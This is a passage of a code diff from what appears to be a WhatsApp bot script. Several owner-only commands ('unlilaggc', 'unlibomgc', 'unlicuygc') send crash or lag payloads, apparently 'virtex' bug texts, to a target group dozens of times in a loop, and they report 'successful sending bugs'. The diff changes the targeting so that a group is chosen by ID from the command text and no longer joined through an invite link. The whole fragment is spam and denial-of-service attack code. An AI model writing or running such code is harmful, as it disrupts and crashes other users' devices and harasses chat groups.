-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${rumgc} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'unlilaggc' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let rumgc = await haikal.groupAcceptInvite(result)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+Pe = text.split("|")[0]+'@g.us'
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: cttl}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${rumgc} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'unlibomgc' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let rumgc = await haikal.groupAcceptInvite(result)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+Pe = text.split("|")[0]+'@g.us'
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: weg}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${rumgc} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'unlicuygc' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let rumgc = await haikal.groupAcceptInvite(result)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+Pe = text.split("|")[0]+'@g.us'
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
